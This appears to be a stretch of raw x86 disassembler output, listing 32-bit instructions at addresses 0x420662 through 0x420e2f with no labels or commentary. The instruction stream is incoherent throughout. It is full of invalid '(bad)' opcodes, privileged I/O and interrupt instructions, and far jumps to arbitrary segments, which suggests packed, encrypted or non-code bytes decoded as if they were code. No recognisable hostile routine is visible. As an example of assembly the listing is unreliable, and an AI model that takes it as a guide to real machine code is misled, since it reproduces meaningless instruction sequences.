  420662:	and    dl,BYTE PTR [esi-0x26739ba]
  420668:	fmul   DWORD PTR [esp+ecx*1]
  42066b:	ror    DWORD PTR [edi+0x34],0xde
  42066f:	jg     0x420651
  420671:	fnstcw WORD PTR [esi-0x10]
  420674:	sub    bl,BYTE PTR [edi+edi*2+0x6d]
  420678:	(bad)  
  42067a:	mov    ch,BYTE PTR [ebp-0x56]
  42067d:	retf   0x257d
  420680:	adc    BYTE PTR [eax-0x5e731104],dh
  420686:	mov    edx,0x3a59dd59
  42068b:	lock test al,0xd9
  42068e:	pop    edi
  42068f:	cmp    DWORD PTR [eax],0xffffff93
  420692:	mov    eax,0xe5c21fcf
  420697:	test   DWORD PTR [ebx-0x46a08052],edx
  42069d:	aaa    
  42069e:	retf   0x34ef
  4206a1:	push   ebp
  4206a2:	mov    DWORD PTR [ecx],esp
  4206a4:	mov    edi,0xccb9e3ba
  4206a9:	mov    dl,0xa4
  4206ab:	pusha  
  4206ac:	rcl    BYTE PTR es:[ebx],1
  4206af:	fwait
  4206b0:	nop
  4206b1:	int3   
  4206b2:	dec    ecx
  4206b3:	fnsave [ebx+0x5c]
  4206b6:	leave  
  4206b7:	pop    eax
  4206b8:	mov    ds:0x1bbb4794,eax
  4206bd:	sub    ah,BYTE PTR [esi+0x14]
  4206c0:	enter  0x9f66,0xc7
  4206c4:	dec    edx
  4206c5:	cmc    
  4206c6:	mul    DWORD PTR [esi+0x5b]
  4206c9:	lahf   
  4206ca:	jno    0x420711
  4206cc:	inc    eax
  4206cd:	outs   dx,BYTE PTR ds:[esi]
  4206ce:	xchg   BYTE PTR [ebx+0x4e],dl
  4206d1:	mov    esp,0x8641baad
  4206d6:	fidiv  DWORD PTR [ecx]
  4206d8:	outs   dx,DWORD PTR ds:[esi]
  4206d9:	imul   esi,DWORD PTR [ebx],0xffffffff
  4206dc:	jmp    0xc553b98c
  4206e1:	xchg   esp,eax
  4206e2:	xchg   edx,eax
  4206e3:	loopne 0x420744
  4206e5:	retf   
  4206e6:	pop    esp
  4206e7:	jmp    0xa226:0x409ce2a8
  4206ee:	xlat   BYTE PTR ds:[ebx]
  4206ef:	or     eax,0x86943746
  4206f4:	xchg   BYTE PTR [ebx],ch
  4206f6:	jmp    0x3c63:0xd0b381cb
  4206fd:	mov    al,cs:0x21117a02
  420703:	fs imul ebp,esi,0x3f
  420707:	sub    cl,BYTE PTR gs:[eax+0x2854a85c]
  42070e:	and    DWORD PTR [eax],esi
  420710:	sahf   
  420711:	cmp    DWORD PTR [ebx-0x5ca6a311],esi
  420717:	je     0x4206af
  420719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42071a:	or     DWORD PTR [edi],esi
  42071c:	fcom   QWORD PTR [edx+0x1c876445]
  420722:	(bad)  
  420723:	(bad)  
  420724:	stc    
  420725:	or     DWORD PTR [esi+ebx*4+0xfd143b5],edx
  42072c:	sub    bh,al
  42072e:	jmp    0x420713
  420730:	mov    ebx,0x2d601626
  420735:	retf   
  420736:	push   esi
  420737:	gs pop ecx
  420739:	retf   
  42073a:	sbb    eax,0xf91b81a6
  42073f:	xchg   esi,eax
  420740:	pop    ebp
  420741:	(bad)  
  420742:	jg     0x420770
  420744:	les    eax,FWORD PTR [edx+0x40]
  420747:	xor    al,ah
  420749:	(bad)  
  42074a:	mov    al,ds:0xfb552918
  42074f:	mov    ds:0xbfae6d97,al
  420754:	xlat   BYTE PTR ds:[ebx]
  420755:	mov    ds:0x3cda7410,eax
  42075a:	cs (bad) 
  42075c:	sub    ebp,DWORD PTR [ecx+0x58]
  42075f:	mov    edi,DWORD PTR [edx]
  420761:	sahf   
  420762:	mov    bl,BYTE PTR [edx]
  420764:	mov    edi,0xd98c6d7
  420769:	sbb    BYTE PTR [ebx-0x251b85c4],0x14
  420770:	scas   eax,DWORD PTR es:[edi]
  420771:	enter  0x1c0c,0x3
  420775:	std    
  420776:	add    al,0x1
  420778:	int    0x29
  42077a:	push   0xb19b5c6
  42077f:	add    ebp,DWORD PTR [edx]
  420781:	cmp    dh,BYTE PTR [edx+0x1e09436c]
  420787:	mov    ch,0xa1
  420789:	rol    BYTE PTR [ecx+eiz*8],0x1e
  42078d:	mov    eax,ds:0x170f842c
  420792:	shr    DWORD PTR [ebx*2-0x56a1d647],0xc9
  42079a:	dec    ebp
  42079b:	popf   
  42079c:	ins    BYTE PTR es:[edi],dx
  42079d:	mov    edi,0x27a9f7c5
  4207a2:	pop    ebx
  4207a3:	mov    BYTE PTR [eax],cl
  4207a5:	lahf   
  4207a6:	sar    DWORD PTR [edx],1
  4207a8:	push   edi
  4207a9:	mov    eax,ds:0xbff9e910
  4207ae:	js     0x4207cf
  4207b0:	xor    DWORD PTR [esi+0x7a],ebx
  4207b3:	cdq    
  4207b4:	push   esi
  4207b5:	sbb    cl,bl
  4207b7:	pushf  
  4207b8:	inc    esi
  4207b9:	pop    edi
  4207ba:	imul   eax,DWORD PTR [ecx+esi*1-0x3c6e3efe],0x8282103d
  4207c5:	sti    
  4207c6:	mov    dl,0xd
  4207c8:	jle    0x420842
  4207ca:	popa   
  4207cb:	cmp    eax,0x51279972
  4207d0:	test   al,dh
  4207d2:	bound  ebx,QWORD PTR [ecx+0x69a82860]
  4207d8:	dec    ebx
  4207d9:	ins    BYTE PTR es:[edi],dx
  4207da:	les    ecx,FWORD PTR [ecx]
  4207dc:	cs sbb al,0x71
  4207df:	pop    ds
  4207e0:	xor    ch,BYTE PTR [esi]
  4207e2:	cs ins BYTE PTR es:[edi],dx
  4207e4:	and    eax,0x5eb6b415
  4207e9:	call   0x35ea:0xe959f587
  4207f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207f1:	xor    eax,0x5c4df631
  4207f6:	aas    
  4207f7:	stos   DWORD PTR es:[edi],eax
  4207f8:	or     DWORD PTR [eax],ecx
  4207fa:	imul   DWORD PTR [ebx]
  4207fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207fd:	pusha  
  4207fe:	aam    0xcc
  420800:	call   0xee78:0x1f194cb7
  420807:	cmp    edx,DWORD PTR [ebx+eiz*8]
  42080a:	jbe    0x420854
  42080c:	push   ebp
  42080d:	add    ebp,ebx
  42080f:	dec    eax
  420810:	loopne 0x420882
  420812:	test   BYTE PTR [ebp+0xb],ch
  420815:	inc    edx
  420816:	ins    BYTE PTR es:[edi],dx
  420817:	cmp    DWORD PTR [ecx+0x5a8b40a3],esi
  42081d:	dec    ecx
  42081e:	cdq    
  42081f:	out    dx,eax
  420820:	shr    BYTE PTR [esi+0x3f],cl
  420823:	shr    BYTE PTR [esp+edi*4],cl
  420826:	daa    
  420827:	push   ds
  420828:	jnp    0x42081e
  42082a:	rol    BYTE PTR ds:0xced8bbd6,cl
  420830:	fimul  WORD PTR [eax]
  420832:	(bad)  
  420833:	adc    DWORD PTR [edi-0x492a1893],esi
  420839:	shl    bl,1
  42083b:	jle    0x420861
  42083d:	lods   eax,DWORD PTR ds:[esi]
  42083e:	je     0x42088d
  420840:	push   ebp
  420841:	sub    BYTE PTR [ebx+0x35e8c99a],cl
  420847:	popf   
  420848:	xchg   edx,eax
  420849:	ss xchg edi,eax
  42084b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084c:	test   DWORD PTR ds:0x325e4d4f,eax
  420852:	retf   
  420853:	and    DWORD PTR [ebx],0x12
  420856:	jns    0x4208be
  420858:	fbld   TBYTE PTR [edx-0x6905f854]
  42085e:	ror    DWORD PTR [ecx],cl
  420860:	loopne 0x42082b
  420862:	dec    edx
  420863:	ret    0xef17
  420866:	push   esp
  420867:	adc    eax,0x129dc2a0
  42086c:	xchg   esi,eax
  42086d:	clc    
  42086e:	daa    
  42086f:	xor    BYTE PTR [edx],cl
  420871:	shr    BYTE PTR [ecx+0x64ae30ff],cl
  420877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420878:	retf   
  420879:	add    esi,DWORD PTR [edi-0x21]
  42087c:	dec    esp
  42087d:	fld    TBYTE PTR [ecx+0x5f]
  420880:	fs aam 0xde
  420883:	je     0x4208af
  420885:	jecxz  0x420807
  420887:	mov    DWORD PTR [edi+0x61c61155],0xe36691c6
  420891:	mov    WORD PTR [ecx+0x2a76b40c],gs
  420897:	cmp    dl,BYTE PTR [edx]
  420899:	aad    0x2d
  42089b:	mov    esp,0x937181df
  4208a0:	sub    cl,dl
  4208a2:	ret    0xaef3
  4208a5:	jg     0x420916
  4208a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208a8:	dec    esp
  4208a9:	sti    
  4208aa:	dec    eax
  4208ab:	mov    ds:0x312f455f,eax
  4208b0:	std    
  4208b1:	lods   al,BYTE PTR ds:[esi]
  4208b2:	out    0xc7,al
  4208b4:	add    BYTE PTR [esi-0x3984c1c3],ch
  4208ba:	aam    0x57
  4208bc:	aam    0x9
  4208be:	mov    DWORD PTR [edi+0x7c],esp
  4208c1:	stc    
  4208c2:	xor    DWORD PTR [ebx],0x49
  4208c5:	xor    esi,esp
  4208c7:	jnp    0x420933
  4208c9:	stos   DWORD PTR es:[edi],eax
  4208ca:	xor    dl,BYTE PTR [ebx+0x15]
  4208cd:	pop    es
  4208ce:	sub    ah,0x49
  4208d1:	(bad)  
  4208d2:	jo     0x42090b
  4208d4:	push   esi
  4208d5:	loopne 0x4208b5
  4208d7:	rcr    DWORD PTR [ebx+0x3b39e68f],cl
  4208dd:	cld    
  4208de:	fistp  DWORD PTR [eax+esi*1+0x3c]
  4208e2:	retf   
  4208e3:	test   DWORD PTR [edi+eiz*4-0x11],0xc24024a3
  4208eb:	loop   0x4208c5
  4208ed:	ins    BYTE PTR es:[edi],dx
  4208ee:	add    ebx,esp
  4208f0:	lds    eax,FWORD PTR [ecx+0x5c]
  4208f3:	std    
  4208f4:	inc    eax
  4208f5:	xchg   ebp,eax
  4208f6:	push   esi
  4208f7:	and    al,0xa6
  4208f9:	xchg   DWORD PTR [ecx-0x6152435],esi
  4208ff:	mov    dl,0x3c
  420901:	retf   
  420902:	mov    es,WORD PTR [eax]
  420904:	fstp   TBYTE PTR [esi-0x4ca7a1c5]
  42090a:	stos   BYTE PTR es:[edi],al
  42090b:	icebp  
  42090c:	or     BYTE PTR [eax-0x3ef6bb6c],al
  420912:	scas   al,BYTE PTR es:[edi]
  420913:	repz inc esi
  420915:	jb     0x420960
  420917:	in     al,dx
  420918:	out    dx,eax
  420919:	pop    es
  42091a:	clc    
  42091b:	sbb    BYTE PTR [edi-0x74],ch
  42091e:	test   eax,0x28bdf905
  420923:	in     al,0x44
  420925:	mov    ebx,0x365b9fea
  42092a:	inc    ecx
  42092b:	and    dl,BYTE PTR [edx+edx*8]
  42092e:	lahf   
  42092f:	cmp    BYTE PTR [eax],cl
  420931:	cmp    al,0xfc
  420933:	add    eax,0xb18257f3
  420938:	in     al,0x7
  42093a:	aad    0xd6
  42093c:	jne    0x4209b3
  42093e:	jge    0x4209b2
  420940:	xchg   ebp,edi
  420942:	fcos   
  420944:	push   es
  420945:	add    eax,0xbce9a75f
  42094a:	ins    BYTE PTR es:[edi],dx
  42094b:	push   edi
  42094c:	sub    DWORD PTR [edx],ebp
  42094e:	sub    DWORD PTR [ebx-0x34],eax
  420951:	xor    DWORD PTR [ecx+0x6],ebx
  420954:	mov    al,ds:0x7ec06c5b
  420959:	add    BYTE PTR [ecx+eax*4+0x6baf2769],al
  420960:	sub    dl,bh
  420962:	sub    al,ch
  420964:	mov    ah,dl
  420966:	pusha  
  420967:	dec    ecx
  420968:	shr    BYTE PTR [edi],1
  42096a:	add    bl,BYTE PTR [esp+edx*1-0x55]
  42096e:	push   cs
  42096f:	repz mov eax,ds:0x1b100d5e
  420975:	lea    edx,[ebp-0x5c]
  420978:	(bad)
  42097c:	lock add cl,al
  42097f:	inc    DWORD PTR [ecx-0x328abb85]
  420985:	sub    eax,DWORD PTR [ebx]
  420987:	jmp    0x420952
  420989:	mov    ecx,0xf916417b
  42098e:	ins    BYTE PTR es:[edi],dx
  42098f:	dec    edx
  420990:	bnd jmp 0x63a2c3b
  420996:	jo     0x42099e
  420998:	jo     0x420957
  42099a:	mov    esp,0x6ce11f91
  42099f:	and    al,0x77
  4209a2:	arpl   WORD PTR [bx+si+0x7261],ax
  4209a7:	lds    eax,FWORD PTR [ebp+ebp*8+0x6e07e558]
  4209ae:	(bad)  
  4209af:	xchg   cl,bh
  4209b1:	pop    ebp
  4209b2:	outs   dx,BYTE PTR ds:[esi]
  4209b3:	mov    esp,0x3d18719d
  4209b8:	aad    0xa5
  4209ba:	xor    eax,0x4e0e4f75
  4209bf:	pop    eax
  4209c0:	and    ebp,edx
  4209c2:	push   esp
  4209c3:	retf   0x2ade
  4209c6:	shr    BYTE PTR [eax-0x7f],1
  4209c9:	outs   dx,BYTE PTR ds:[esi]
  4209ca:	sbb    BYTE PTR [ebp+0x77],dl
  4209cd:	jecxz  0x420a3e
  4209cf:	clc    
  4209d0:	push   ds
  4209d1:	add    DWORD PTR [edx-0x37],edi
  4209d4:	fld    QWORD PTR [ebp+edx*2-0x35cabde3]
  4209db:	inc    esi
  4209dc:	adc    al,0x43
  4209de:	adc    esp,ebp
  4209e0:	pop    ds
  4209e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e2:	mov    al,0x1e
  4209e4:	inc    eax
  4209e5:	cmp    esp,esp
  4209e7:	lods   al,BYTE PTR ds:[esi]
  4209e8:	les    ebp,FWORD PTR [eax+0x32]
  4209eb:	adc    al,BYTE PTR [ebp-0x5b21d95f]
  4209f1:	fbld   TBYTE PTR [ebx-0x7df765e4]
  4209f7:	mov    ebp,0x43a8a093
  4209fc:	ror    DWORD PTR [edx],1
  4209fe:	ret    0x4146
  420a01:	mov    dh,0x7b
  420a03:	mov    dh,0xf7
  420a05:	push   edi
  420a06:	sbb    ebp,eax
  420a08:	cmp    BYTE PTR [edi],0xf7
  420a0b:	adc    DWORD PTR [eax+0x17],0xfffffffe
  420a0f:	mov    eax,0x30ac563f
  420a14:	das    
  420a15:	mov    dl,0x36
  420a17:	fbld   TBYTE PTR [edx+0x31]
  420a1a:	inc    ebx
  420a1b:	jp     0x420a79
  420a1d:	push   0x5c
  420a1f:	jmp    0x4209b5
  420a21:	mov    eax,ds:0x2fd11100
  420a26:	pusha  
  420a27:	xchg   edx,eax
  420a28:	add    al,0x5f
  420a2a:	sub    eax,0x66fba82f
  420a2f:	dec    ecx
  420a30:	ja     0x420a52
  420a32:	jbe    0x420aa3
  420a34:	xchg   ebx,eax
  420a35:	les    eax,FWORD PTR [ecx]
  420a37:	ja     0x420a22
  420a39:	into   
  420a3a:	dec    ebp
  420a3b:	push   ecx
  420a3c:	rcl    DWORD PTR [ecx-0x7a8a17b],cl
  420a42:	jp     0x420a3d
  420a44:	xchg   DWORD PTR [esi],edi
  420a46:	repnz test BYTE PTR [edi+esi*1],cl
  420a4a:	div    DWORD PTR [ebx+0x74e80a48]
  420a50:	push   ecx
  420a51:	fdivr  QWORD PTR [ecx-0x59552252]
  420a57:	mov    cl,0xe2
  420a59:	rol    DWORD PTR [ebx+0x606e118f],0x58
  420a60:	loopne 0x420a61
  420a62:	sbb    al,0x54
  420a64:	ja     0x4209fd
  420a66:	ffree  st(0)
  420a68:	lahf   
  420a69:	and    eax,esi
  420a6b:	and    eax,0xee51c7ec
  420a70:	jnp    0x4209fc
  420a72:	scas   eax,DWORD PTR es:[edi]
  420a73:	dec    edi
  420a74:	sbb    ebp,DWORD PTR [edi-0x76]
  420a77:	push   0xffffffa0
  420a79:	cmp    ecx,edx
  420a7b:	and    ebx,DWORD PTR [edx-0xef8df21]
  420a81:	aaa    
  420a82:	fidiv  WORD PTR [esi]
  420a84:	push   0xe56d31e4
  420a89:	ins    BYTE PTR es:[edi],dx
  420a8a:	mov    ds:0xa3f3886c,eax
  420a8f:	mov    WORD PTR [ebp+esi*4-0x76088a51],gs
  420a96:	xchg   edx,eax
  420a97:	xchg   ebx,eax
  420a98:	in     al,dx
  420a99:	mov    ds:0x156d8157,eax
  420a9e:	xor    bh,BYTE PTR [ebp+0x54a172cb]
  420aa4:	int3   
  420aa5:	jns    0x420a48
  420aa7:	jle    0x420a78
  420aa9:	jmp    0xb5a0:0xa37590e6
  420ab0:	xor    eax,0x99052051
  420ab5:	in     al,0x1f
  420ab7:	out    dx,eax
  420ab8:	imul   edx,DWORD PTR [ebp+0x21a6c670],0xffffff89
  420abf:	jno    0x420b33
  420ac1:	push   ds
  420ac2:	mov    al,0xaa
  420ac4:	repnz mov dl,0xbd
  420ac7:	inc    edi
  420ac8:	das    
  420ac9:	in     al,dx
  420aca:	out    dx,eax
  420acb:	lock pop ss
  420acd:	mov    edx,0xa570bfd3
  420ad2:	daa    
  420ad3:	mov    esp,0x19511a48
  420ad8:	stos   BYTE PTR es:[edi],al
  420ad9:	(bad)  
  420ada:	fsubr  DWORD PTR [si+0x768e]
  420adf:	jb     0x420b04
  420ae1:	mov    ecx,0xf0450c4b
  420ae6:	lds    esi,FWORD PTR [ebx-0x67]
  420ae9:	call   0xd4d28b38
  420aee:	xchg   esi,eax
  420aef:	xchg   BYTE PTR [edi],ch
  420af1:	sbb    BYTE PTR es:[edx-0x7d],ah
  420af5:	cli    
  420af6:	retf   0x36aa
  420af9:	inc    ebp
  420afa:	jae    0x420a94
  420afc:	std    
  420afd:	mov    ebp,0x86af9f42
  420b02:	sub    esi,edx
  420b04:	psubw  mm1,QWORD PTR [ecx-0xe]
  420b08:	bound  ebx,QWORD PTR [edx]
  420b0a:	js     0x420b89
  420b0c:	sub    DWORD PTR [ebx],ebp
  420b0e:	shr    DWORD PTR [eax],1
  420b10:	sub    al,0xe3
  420b12:	sub    edi,DWORD PTR [edi+eiz*2-0x376f2ee]
  420b19:	rcl    BYTE PTR [esi+0x6d],1
  420b1c:	loope  0x420aef
  420b1e:	repnz mov ss,WORD PTR [ebx]
  420b21:	push   ds
  420b22:	(bad)  
  420b23:	mov    BYTE PTR [ebx-0x38f21d1c],bh
  420b29:	cmc    
  420b2a:	fisubr DWORD PTR [esi]
  420b2c:	into   
  420b2d:	in     al,0x9c
  420b2f:	retf   0x2467
  420b32:	lds    eax,FWORD PTR [esi]
  420b34:	mov    ecx,0x34f9e50e
  420b39:	jns    0x420b4f
  420b3b:	xchg   ecx,eax
  420b3c:	leave  
  420b3d:	cmp    al,0x31
  420b3f:	mov    ecx,0x2db54992
  420b44:	push   ebp
  420b45:	fwait
  420b46:	stos   BYTE PTR es:[edi],al
  420b47:	fmul   DWORD PTR [ecx-0x7dfd2893]
  420b4d:	lock mov edx,0x7f9ca9b
  420b53:	mov    eax,0x559397f0
  420b58:	adc    eax,0x6dca7c43
  420b5d:	cmp    ebp,edx
  420b5f:	mov    al,ds:0x7877475f
  420b64:	in     eax,0xcb
  420b66:	std    
  420b67:	rol    BYTE PTR [ebx+0x16],0xb3
  420b6b:	push   ebx
  420b6c:	stc    
  420b6d:	fstp   TBYTE PTR [esi]
  420b6f:	sbb    ch,BYTE PTR [eax+0x1bf54f5c]
  420b75:	pop    es
  420b76:	pop    eax
  420b77:	cli    
  420b78:	(bad)  
  420b79:	test   al,0x9a
  420b7b:	lods   al,BYTE PTR ds:[esi]
  420b7c:	sbb    al,0xae
  420b7e:	popf   
  420b7f:	mov    ecx,0xc1259df1
  420b84:	aad    0x66
  420b86:	jg     0x420bf3
  420b88:	inc    edx
  420b89:	or     al,0xce
  420b8b:	mov    dl,0x5
  420b8d:	adc    BYTE PTR [edx-0x52],al
  420b90:	jp     0x420b2d
  420b92:	test   BYTE PTR fs:[edx-0x76],bh
  420b96:	xchg   esi,eax
  420b97:	add    BYTE PTR [ecx-0x19957500],dh
  420b9d:	mov    ebp,0xb9eaef2e
  420ba2:	hlt    
  420ba3:	rsqrtps xmm1,xmm2
  420ba6:	inc    edx
  420ba7:	repnz call 0x9529:0x9f9bf01b
  420baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bb0:	sbb    al,BYTE PTR [ebx]
  420bb2:	inc    edi
  420bb3:	bound  ebp,QWORD PTR [esi+0x3500ee45]
  420bb9:	fdiv   QWORD PTR [edi+0x5fc735f]
  420bbf:	inc    esp
  420bc0:	jmp    0x420c1c
  420bc2:	push   ebx
  420bc3:	imul   edi,DWORD PTR [esi+0x50],0x5f
  420bc7:	mov    bl,BYTE PTR [eax+0xc]
  420bca:	sub    esi,DWORD PTR [ecx-0x39]
  420bcd:	fidiv  WORD PTR [ecx]
  420bcf:	jl     0x420b9b
  420bd1:	or     DWORD PTR [ebx+ebx*2],edi
  420bd4:	inc    edx
  420bd5:	pop    esi
  420bd6:	fdivr  QWORD PTR ds:0x371ab6d9
  420bdc:	or     DWORD PTR ds:[edx-0x5d],edi
  420be0:	test   ch,ah
  420be2:	clc    
  420be3:	frstor [eax]
  420be5:	sub    eax,0xc951dca7
  420bea:	pusha  
  420beb:	push   ss
  420bec:	pusha  
  420bed:	test   esi,ebp
  420bef:	xchg   BYTE PTR [edi+edx*4],bl
  420bf2:	pusha  
  420bf3:	iret   
  420bf4:	shl    BYTE PTR [esi+0xa931c87],0xcf
  420bfb:	mov    ds:0x5cfa077f,eax
  420c00:	jecxz  0x420bc8
  420c02:	xchg   edi,eax
  420c03:	xchg   esi,eax
  420c04:	es aad 0x4
  420c07:	push   cs
  420c08:	pop    ebp
  420c09:	fs mov cl,0x47
  420c0c:	push   dx
  420c0e:	push   edi
  420c0f:	jns    0x420c72
  420c11:	dec    ecx
  420c12:	cmc    
  420c13:	mov    eax,ds:0x6868201a
  420c18:	sub    ecx,DWORD PTR [edx-0x58]
  420c1b:	add    cl,BYTE PTR [ecx]
  420c1d:	pusha  
  420c1e:	(bad)  
  420c1f:	test   eax,0x227ed0d
  420c24:	mov    al,ds:0xacd0afd3
  420c29:	dec    ebp
  420c2a:	fldcw  WORD PTR [ecx-0x3efda2fd]
  420c30:	mov    ecx,0x2beefa58
  420c35:	jne    0x420c75
  420c37:	int    0xe1
  420c39:	push   ds
  420c3a:	pop    esi
  420c3b:	xor    DWORD PTR [ecx+0x46],0xffffffa4
  420c3f:	cmp    BYTE PTR [ebp-0x21649b08],bl
  420c45:	fucom  st(6)
  420c47:	mov    eax,0xd3f01656
  420c4c:	iret   
  420c4d:	test   BYTE PTR [esi+0x502d2e1f],dl
  420c53:	and    DWORD PTR [edx],ebx
  420c55:	xor    BYTE PTR [esi+ecx*8+0x19651a52],cl
  420c5c:	(bad)  
  420c5e:	repnz pop edi
  420c60:	adc    BYTE PTR [ecx-0x4c681308],bh
  420c66:	imul   ebx,DWORD PTR [ebx],0xfffffffc
  420c69:	sbb    al,0x4c
  420c6b:	xor    eax,0x7d5fab9b
  420c70:	or     al,0x7f
  420c72:	xor    edx,0x3f054566
  420c78:	lods   eax,DWORD PTR ds:[esi]
  420c79:	pop    edi
  420c7a:	fsub   QWORD PTR [ebx-0x5516151b]
  420c80:	clc    
  420c81:	cwde   
  420c82:	xchg   DWORD PTR [esi-0x1f52e0d5],edx
  420c88:	push   ds
  420c89:	bound  dx,DWORD PTR [eax]
  420c8c:	aam    0x6
  420c8e:	add    ecx,DWORD PTR [esi]
  420c90:	mov    ebx,0xe10e04bb
  420c95:	call   0x371d3705
  420c9a:	dec    esp
  420c9b:	aam    0xd0
  420c9d:	or     BYTE PTR [ebp-0x3a548139],dl
  420ca3:	int    0xf9
  420ca5:	mov    ah,BYTE PTR [eax-0x3d4cf0d6]
  420cab:	mov    dh,BYTE PTR [eax+0x13]
  420cae:	mov    bl,0xde
  420cb0:	loopne 0x420d1e
  420cb2:	xchg   edx,eax
  420cb3:	push   esi
  420cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb5:	leave  
  420cb6:	cmp    BYTE PTR [ebp+0x15],dh
  420cb9:	dec    eax
  420cba:	popf   
  420cbb:	add    DWORD PTR [eax],esp
  420cbd:	(bad)  
  420cbf:	pop    ebp
  420cc0:	in     eax,dx
  420cc1:	push   ds
  420cc2:	fsubr  DWORD PTR [edi+0x5400495]
  420cc8:	aaa    
  420cc9:	add    esp,DWORD PTR [edx+0x4d]
  420ccc:	inc    edx
  420ccd:	scas   eax,DWORD PTR es:[edi]
  420cce:	jne    0x420c95
  420cd0:	hlt    
  420cd1:	ins    DWORD PTR es:[edi],dx
  420cd2:	das    
  420cd3:	fstp   DWORD PTR [esi+0x32]
  420cd6:	mov    ah,0x8b
  420cd8:	mov    ebp,0x4936e09f
  420cdd:	dec    edx
  420cde:	(bad)  
  420cdf:	(bad)  
  420ce0:	stc    
  420ce1:	pop    edi
  420ce2:	adc    DWORD PTR [esi+0x4b],ecx
  420ce5:	outs   dx,DWORD PTR ds:[esi]
  420ce6:	cmp    eax,0x397bb631
  420ceb:	dec    ecx
  420cec:	shr    DWORD PTR [ecx-0x21],1
  420cef:	and    al,0xcf
  420cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cf2:	cld    
  420cf3:	mov    dh,0xaa
  420cf5:	ins    DWORD PTR es:[edi],dx
  420cf6:	aad    0x97
  420cf8:	jmp    0x420ca2
  420cfa:	stos   BYTE PTR es:[edi],al
  420cfb:	loop   0x420d6d
  420cfd:	enter  0x93e4,0x19
  420d01:	rcr    edi,0x17
  420d04:	lods   al,BYTE PTR fs:[esi]
  420d06:	retf   
  420d07:	loop   0x420ce7
  420d09:	fdiv   DWORD PTR [ecx]
  420d0b:	call   0x93ba0878
  420d10:	mov    eax,ds:0x21ed3ca1
  420d15:	jp     0x420d7d
  420d17:	mov    edi,0x3cafa501
  420d1c:	es ret 0x5897
  420d20:	inc    ecx
  420d21:	popa   
  420d22:	mov    edi,0x77763add
  420d27:	inc    edi
  420d28:	lock sbb DWORD PTR [edx-0x381316b1],eax
  420d2f:	mov    WORD PTR [esi+0x34],cs
  420d32:	add    edi,DWORD PTR gs:[esi+edx*4+0x2c]
  420d37:	popa   
  420d38:	xchg   esp,eax
  420d39:	mov    ebx,0x1844d42a
  420d3e:	out    dx,eax
  420d3f:	mov    ah,0x8e
  420d41:	xchg   esi,eax
  420d42:	or     eax,DWORD PTR [ecx+0x14]
  420d45:	xor    edi,edi
  420d47:	aaa    
  420d48:	arpl   WORD PTR ds:0xfba185f,bp
  420d4e:	pop    ds
  420d4f:	jmp    0x420d0a
  420d51:	push   ss
  420d52:	xchg   ebp,eax
  420d53:	jg     0x420d08
  420d55:	jb     0x420d01
  420d57:	add    DWORD PTR [ebx+0x515caf1f],esi
  420d5d:	je     0x420d2b
  420d5f:	push   edi
  420d60:	(bad)  
  420d61:	mov    dl,al
  420d63:	sbb    BYTE PTR [ebp+0x27],ch
  420d66:	(bad)
  420d6a:	mov    edx,0x4628d73e
  420d6f:	cmp    ebx,DWORD PTR [ebx+0x49]
  420d72:	cmp    eax,0xffd9fc20
  420d77:	adc    BYTE PTR [eax+0x67bb251e],bh
  420d7d:	loopne 0x420d2b
  420d7f:	enter  0x8cc4,0xc8
  420d83:	jns    0x420deb
  420d85:	stc    
  420d86:	or     al,0xda
  420d88:	fcomp  DWORD PTR [ebp+0x61]
  420d8b:	sbb    BYTE PTR [edx+0x4f7b4794],dh
  420d91:	outs   dx,BYTE PTR ds:[esi]
  420d92:	cmps   BYTE PTR cs:[si],BYTE PTR es:[di]
  420d95:	mov    ah,0xb8
  420d97:	xchg   esp,eax
  420d98:	and    BYTE PTR [esi],cl
  420d9a:	push   0x74
  420d9c:	adc    al,0x5a
  420d9e:	add    BYTE PTR [ebx+edi*2+0x313207df],dl
  420da5:	nop
  420da6:	cdq    
  420da7:	add    ecx,DWORD PTR [esi+0x7c]
  420daa:	mov    edx,0xee655e4a
  420daf:	mov    al,0xa8
  420db1:	xchg   esi,ecx
  420db3:	sbb    dl,BYTE PTR [ecx]
  420db5:	mov    dh,0x20
  420db7:	xchg   edx,eax
  420db8:	push   eax
  420db9:	fdivp  st(1),st
  420dbb:	retf   
  420dbc:	jl     0x420d9d
  420dbe:	cmp    bh,ch
  420dc0:	sub    bl,dl
  420dc2:	lock mov al,0x63
  420dc5:	add    bl,bh
  420dc7:	sbb    edx,esp
  420dc9:	push   edi
  420dca:	sbb    al,0x37
  420dcc:	ja     0x420d74
  420dce:	xor    BYTE PTR ds:0xd6f81eb3,0x29
  420dd5:	mov    ds:0xaec34228,eax
  420dda:	test   BYTE PTR [edx+0x2d],dh
  420ddd:	gs mov es,esi
  420de0:	push   ss
  420de1:	aam    0x85
  420de3:	sbb    dh,BYTE PTR [edx+0x169343fa]
  420de9:	mov    bl,0xce
  420deb:	cwde   
  420dec:	xor    eax,0x1d90feb0
  420df1:	xlat   BYTE PTR ds:[ebx]
  420df2:	jmp    0x420e1c
  420df4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420df6:	sti    
  420df7:	cmc    
  420df8:	push   cs
  420df9:	js     0x420e5e
  420dfb:	sub    DWORD PTR [esi-0x193ed863],ecx
  420e01:	adc    DWORD PTR [edx],edx
  420e03:	fist   DWORD PTR [esi]
  420e05:	idiv   BYTE PTR fs:[edx]
  420e08:	and    eax,0xcd2a6b51
  420e0d:	jp     0x420e55
  420e0f:	scas   al,BYTE PTR es:[edi]
  420e10:	push   es
  420e11:	shl    dh,cl
  420e13:	adc    BYTE PTR ds:0xf29a4e4d,bl
  420e19:	out    0x61,al
  420e1b:	mov    al,0xb7
  420e1d:	lock or al,0x99
  420e20:	pop    eax
  420e21:	fwait
  420e22:	in     al,dx
  420e23:	mov    al,ds:0x5353a0ee
  420e28:	sub    al,0x29
  420e2a:	sbb    BYTE PTR [esi],bl
  420e2c:	pop    ecx
  420e2d:	mov    WORD PTR [ecx],cs
  420e2f:	cdq    
